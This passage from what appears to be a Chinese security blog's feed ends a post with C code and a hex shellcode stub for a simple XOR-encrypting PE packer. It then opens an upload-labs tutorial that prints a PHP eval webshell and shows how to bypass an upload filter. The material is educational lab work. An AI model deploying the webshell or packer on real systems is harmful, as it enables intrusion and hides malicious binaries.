85\x5C\xFE\xFF\xFF\x73\x26\x8B\x85\x50\xFE\xFF\xFF\x8B\x8D\xC8\xFE\xFF\xFF\x8B\x14\x81\x81\xF2\x78\x56\x34\x12\x8B\x85\x50\xFE\xFF\xFF\x8B\x8D\xC8\xFE\xFF\xFF\x89\x14\x81\xEB\xBD\xE9\x51\x02\x00\x00\x8B\x85\x74\xFE\xFF\xFF\x83\x38\x00\x0F\x84\xE3\x00\x00\x00\x8B\x85\x74\xFE\xFF\xFF\x8B\x08\x89\x8D\x44\xFE\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x83\xC0\x08\x89\x85\x38\xFE\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x8B\x48\x04\x83\xE9\x08\xD1\xE9\x89\x8D\x2C\xFE\xFF\xFF\xC7\x85\x20\xFE\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\x20\xFE\xFF\xFF\x83\xC0\x01\x89\x85\x20\xFE\xFF\xFF\x8B\x85\x20\xFE\xFF\xFF\x3B\x85\x2C\xFE\xFF\xFF\x7D\x6F\x8B\x85\x20\xFE\xFF\xFF\x8B\x8D\x38\xFE\xFF\xFF\x0F\xB7\x14\x41\x81\xE2\xFF\x0F\x00\x00\x03\x95\x44\xFE\xFF\xFF\x3B\x95\xBC\xFE\xFF\xFF\x76\x02\xEB\xBD\x8B\x85\x20\xFE\xFF\xFF\x8B\x8D\x38\xFE\xFF\xFF\x0F\xB7\x14\x41\x81\xE2\xFF\x0F\x00\x00\x03\x95\x1C\xFF\xFF\xFF\x03\x95\x44\xFE\xFF\xFF\x89\x95\x14\xFE\xFF\xFF\x8B\x85\x14\xFE\xFF\xFF\x8B\x08\x03\x8D\x68\xFE\xFF\xFF\x2B\x8D\x1C\xFF\xFF\xFF\x8B\x95\x14\xFE\xFF\xFF\x89\x0A\xE9\x74\xFF\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x8B\x8D\x74\xFE\xFF\xFF\x03\x48\x04\x89\x8D\x74\xFE\xFF\xFF\xE9\x0E\xFF\xFF\xFF\xC7\x85\x08\xFE\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\x08\xFE\xFF\xFF\x83\xC0\x01\x89\x85\x08\xFE\xFF\xFF\x8B\x85\x08\xFE\xFF\xFF\x3B\x85\x5C\xFE\xFF\xFF\x73\x26\x8B\x85\x08\xFE\xFF\xFF\x8B\x8D\xC8\xFE\xFF\xFF\x8B\x14\x81\x81\xF2\x78\x56\x34\x12\x8B\x85\x08\xFE\xFF\xFF\x8B\x8D\xC8\xFE\xFF\xFF\x89\x14\x81\xEB\xBD\xB8\x08\x00\x00\x00\x6B\xC8\x05\x8B\x95\x04\xFF\xFF\xFF\x8B\x85\x1C\xFF\xFF\xFF\x03\x44\x0A\x60\x89\x85\x74\xFE\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x83\x38\x00\x0F\x84\xE3\x00\x00\x00\x8B\x85\x74\xFE\xFF\xFF\x8B\x08\x89\x8D\xFC\xFD\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x83\xC0\x08\x89\x85\xF0\xFD\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x8B\x48\x04\x83\xE9\x08\xD1\xE9\x89\x8D\xE4\xFD\xFF\xFF\xC7\x85\xD8\xFD\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\xD8\xFD\xFF\xFF\x83\xC0\x01\x89\x85\xD8\xFD\xFF\xFF\x8B\x85\xD8\xFD\xFF\xFF\x3B\x85\xE4\xFD\xFF\xFF\x7D\x6F\x8B\x85\xD8\xFD\xFF\xFF\x8B\x8D\xF0\xFD\xFF\xFF\x0F\xB7\x14\x41\x81\xE2\xFF\x0F\x00\x00\x03\x95\xFC\xFD\xFF\xFF\x3B\x95\xBC\xFE\xFF\xFF\x76\x02\xEB\xBD\x8B\x85\xD8\xFD\xFF\xFF\x8B\x8D\xF0\xFD\xFF\xFF\x0F\xB7\x14\x41\x81\xE2\xFF\x0F\x00\x00\x03\x95\x1C\xFF\xFF\xFF\x03\x95\xFC\xFD\xFF\xFF\x89\x95\xCC\xFD\xFF\xFF\x8B\x85\xCC\xFD\xFF\xFF\x8B\x08\x2B\x8D\x68\xFE\xFF\xFF\x03\x8D\x1C\xFF\xFF\xFF\x8B\x95\xCC\xFD\xFF\xFF\x89\x0A\xE9\x74\xFF\xFF\xFF\x8B\x85\x74\xFE\xFF\xFF\x8B\x8D\x74\xFE\xFF\xFF\x03\x48\x04\x89\x8D\x74\xFE\xFF\xFF\xE9\x0E\xFF\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x5F\x5E\x5B\x81\xC4\xB8\x03\x00\x00\x90\x90\x90\x90\x90\x90\x90\x8B\xE5\x5D&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD ShellCodeLenth = <span class="number">1760</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadExeFile</span><span class="params">(CHAR* szNewFilePath, BYTE** buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">hFile = CreateFileA(szNewFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//这里申请的空间+多少需要根据生成的shellcode长度来确定</span></span><br><span class="line">*buffer = <span class="keyword">new</span> BYTE[dwFileSize+<span class="number">2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ReadFile(hFile, *buffer, dwFileSize, &amp;dwNumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">AddNewSectionHeader</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_NT_HEADERSINH = (PIMAGE_NT_HEADERS)(pbuf + pIDH-&gt;e_lfanew);</span><br><span class="line">PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line">DWORD OldSectionNumber = pIFH-&gt;NumberOfSections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//节区数加1</span></span><br><span class="line">pIFH-&gt;NumberOfSections = OldSectionNumber + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改PMAGE_OPTIONAL_HEADER中的Size of Image，添加大小必须满足Section Alignment的倍数关系</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, (ShellCodeLenth / pIOH-&gt;SectionAlignment + <span class="number">1</span>));</span><br><span class="line">pIOH-&gt;SizeOfImage = (ShellCodeLenth / pIOH-&gt;SectionAlignment + <span class="number">1</span>) * pIOH-&gt;SectionAlignment+ pIOH-&gt;SizeOfImage;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取最后一个节区的一些数据</span></span><br><span class="line">PIMAGE_SECTION_HEADER pLastSectionHeader = (PIMAGE_SECTION_HEADER)(pISH + OldSectionNumber - <span class="number">1</span>);</span><br><span class="line">DWORD LastVirtualSize = pLastSectionHeader-&gt;Misc.VirtualSize;</span><br><span class="line">DWORD LastVirtualAddress = pLastSectionHeader-&gt;VirtualAddress;</span><br><span class="line">DWORD LastSizeOfRawData = pLastSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">DWORD LastPointerToRawData = pLastSectionHeader-&gt;PointerToRawData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加新节区</span></span><br><span class="line">PIMAGE_SECTION_HEADER pNewSectionHeader = (PIMAGE_SECTION_HEADER)(pISH + OldSectionNumber);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;pNewSectionHeader-&gt;Name, <span class="string">&quot;.Shell&quot;</span>, <span class="number">6</span>);</span><br><span class="line">pNewSectionHeader-&gt;Misc.VirtualSize = ShellCodeLenth;</span><br><span class="line">pNewSectionHeader-&gt;VirtualAddress = (LastVirtualSize / pIOH-&gt;SectionAlignment + <span class="number">1</span>) * pIOH-&gt;SectionAlignment + LastVirtualAddress;</span><br><span class="line">pNewSectionHeader-&gt;SizeOfRawData = (ShellCodeLenth / pIOH-&gt;FileAlignment + <span class="number">1</span>) * pIOH-&gt;FileAlignment;</span><br><span class="line">pNewSectionHeader-&gt;PointerToRawData = LastSizeOfRawData + LastPointerToRawData;</span><br><span class="line">pNewSectionHeader-&gt;PointerToRelocations = <span class="number">0</span>;</span><br><span class="line">pNewSectionHeader-&gt;PointerToLinenumbers = <span class="number">0</span>;</span><br><span class="line">pNewSectionHeader-&gt;NumberOfLinenumbers = <span class="number">0</span>;</span><br><span class="line">pNewSectionHeader-&gt;NumberOfRelocations = <span class="number">0</span>;</span><br><span class="line">pNewSectionHeader-&gt;Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EncodeTextSection</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_NT_HEADERSpINH = (PIMAGE_NT_HEADERS)(pbuf + pIDH-&gt;e_lfanew);</span><br><span class="line">PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line">DWORD OldSectionNumber = pIFH-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line">DWORD dwTextsize;</span><br><span class="line">DWORD* pTextStart=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; OldSectionNumber; pISH++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(pISH-&gt;Name, <span class="string">&quot;.text&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwTextsize = pISH-&gt;Misc.VirtualSize;</span><br><span class="line">pTextStart = (DWORD*)(pISH-&gt;PointerToRawData + (DWORD)pIDH);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD Round=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dwTextsize % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Round = dwTextsize / <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Round = dwTextsize/<span class="number">4</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Round; i++)</span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pTextStart + i ) = *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pTextStart + i ) ^ <span class="number">0x12345678</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//本来想用blowfish加密方式加密的，但是写shellcode解密比较麻烦，就放弃了。</span></span><br><span class="line"><span class="comment">//BLOWFISH_CTX ctx;</span></span><br><span class="line"><span class="comment">//BlowFishInit(&amp;ctx, (unsigned char*)&quot;Shell&quot;, strlen(&quot;Shell&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//DWORD Round;</span></span><br><span class="line"><span class="comment">//if (dwTextsize / 8 == 0)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//Round = dwTextsize / 8;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//Round = dwTextsize + 1;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//printf(&quot;%x &quot;, dwTextsize);</span></span><br><span class="line"><span class="comment">////BlowFish_Encry(&amp;ctx, &amp;L, &amp;R);</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; Round; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//BlowFish_Encry(&amp;ctx, (unsigned int*)(pTextStart + i * 8), (unsigned int*)(pTextStart + i * 8 + 4));</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">AddShellCode</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">PIMAGE_SECTION_HEADER pNewSectionHeader = (PIMAGE_SECTION_HEADER)(pISH + pIFH-&gt;NumberOfSections - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">PBYTE ShellSectionStart = pbuf + pNewSectionHeader-&gt;PointerToRawData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加绝对跳转，并且空出4byte空间存储原来的ImageBase，用于shellcode还原到重定位前。</span></span><br><span class="line">*(DWORD*)ShellSectionStart = <span class="number">0x4750674</span>;</span><br><span class="line">ShellSectionStart = ShellSectionStart+ <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">*(DWORD*)ShellSectionStart = pIOH-&gt;ImageBase;</span><br><span class="line">ShellSectionStart = ShellSectionStart + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加shellcode到新节区</span></span><br><span class="line"><span class="built_in">memcpy</span>(ShellSectionStart, shellcode, ShellCodeLenth);</span><br><span class="line">ShellSectionStart = ShellSectionStart + ShellCodeLenth;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行完shellcode解密后，跳转到原EP，需要算一下偏移。</span></span><br><span class="line">*(<span class="keyword">char</span>*)ShellSectionStart = <span class="number">0xe9</span>;</span><br><span class="line">ShellSectionStart = ShellSectionStart + <span class="number">1</span>;</span><br><span class="line">DWORD offset = pIOH-&gt;AddressOfEntryPoint - pNewSectionHeader-&gt;VirtualAddress - ShellCodeLenth<span class="number">-13</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(ShellSectionStart, &amp;offset, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改EP为shellcode的起始地址，也就是OEP</span></span><br><span class="line">DWORD OldEntryPoint = pIOH-&gt;AddressOfEntryPoint;</span><br><span class="line">pIOH-&gt;AddressOfEntryPoint = pNewSectionHeader-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将修改后的数据写入新文件中</span></span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(<span class="string">&quot;test_shell.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">DWORD NewFileSize = pNewSectionHeader-&gt;PointerToRawData + pNewSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">fwrite(pbuf, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> __int8), NewFileSize, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">Blowfishtest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> L = <span class="number">0x546F4EBF</span>, R = <span class="number">0xB4ED937B</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123; <span class="number">0xBF</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0xB4</span>, <span class="number">0x7E</span>, <span class="number">0xA0</span>,</span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xDD</span>, <span class="number">0xEF</span>, <span class="number">0xD3</span>, <span class="number">0x13</span>, <span class="number">0x0F</span>, <span class="number">0xAE</span>, <span class="number">0x09</span>, <span class="number">0x22</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xDF</span>, <span class="number">0x4E</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>, <span class="number">0x78</span>, <span class="number">0x33</span>, <span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0xE5</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x1C</span> &#125;;</span><br><span class="line"></span><br><span class="line">BLOWFISH_CTX ctx;</span><br><span class="line"><span class="comment">//BlowFish_Encry(&amp;ctx, &amp;L, &amp;R);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">BlowFish_Decrypt(&amp;ctx, (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(enc + i * <span class="number">8</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(enc + i * <span class="number">8</span> + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, enc);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ExeShell</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//添加一个新节区，用来装解密的shellcode。</span></span><br><span class="line">AddNewSectionHeader(pbuf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//采用异或加密text节区。</span></span><br><span class="line">EncodeTextSection(pbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加shellcode</span></span><br><span class="line">AddShellCode(pbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Blowfishtest();</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//CHAR szExePath[MAX_PATH] = &quot;D:\\xor.exe&quot;;</span></span><br><span class="line">PBYTE buf;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//申请空间，并读取目标exe文件</span></span><br><span class="line">ReadExeFile(argv[<span class="number">1</span>], &amp;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//加壳</span></span><br><span class="line">ExeShell(buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Packing Success!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;USAGE  : %s FilePath\n\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="成品实验"><a href="#成品实验" class="headerlink" title="成品实验"></a>成品实验</h2><p>The_Itach1.exe是一个弹窗程序。<br><img src="https://s2.loli.net/2022/03/30/RJUAqT9iSC7HtZ1.png"><br>然后加壳生成test_shell.exe，运行一下。<br><img src="https://s2.loli.net/2022/03/30/8hkiFbqMy5E73uC.png"><br>可以看到，仍然正常运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面没有详细的讲解过程，但是看代码应该就完全可以明白了，而且这是最简单的一种壳的实现方式，如果shellcode写的更好，完全可以做到像upx壳完全隐藏原文件信息，将原文件信息和解密代码都放在upx1的节区中。可以通过编写一个壳来熟悉PE结构。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程开发 </tag>
            
            <tag> 壳 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top 10 learning</title>
      <link href="2022/03/15/OWASP%20Top%2010%20learning/"/>
      <url>2022/03/15/OWASP%20Top%2010%20learning/</url>
      
        <content type="html"><![CDATA[<h1 id="OWASP-Top-10-learning"><a href="#OWASP-Top-10-learning" class="headerlink" title="OWASP Top 10 learning"></a>OWASP Top 10 learning</h1><p>web常见基础漏洞学习</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload-labs环境搭建<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h3 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h3><p>前端的js检测</p><p>PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到只允许jpg，png，gif文件的上传。</p><p>我们可以采取删除本js检测或者通过bp抓包的方式去手动修改文件后缀。</p><p>首先准备个一句话木马，也就是webshell，名称为1.jpg。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>js检测代码删除。<br><img src="https://s2.loli.net/2022/02/08/7Y1ROtdFKWTlcLN.png"><br>bp抓包修改jpg为php<br><img src="https://s2.loli.net/2022/02/08/cmN3KBgfP16sAa4.png"></p><p>上传成功后就可以使用蚁剑链接了。<br><img src="https://s2.loli.net/2022/02/08/GhL2zNPlMXp3Uid.png"></p><h3 id="Pass-2-MIME-TYPE验证绕过"><a href="#Pass-2-MIME-TYPE验证绕过" class="headerlink" title="Pass-2-MIME-TYPE验证绕过"></a>Pass-2-MIME-TYPE验证绕过</h3><p>原理：即后端对HTTP Header中的Content-Type检测。</p><pre><code>Content-Type返回内容的MIME类型Content-Type: text/html; charset=utf-8</code></pre><p>代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span 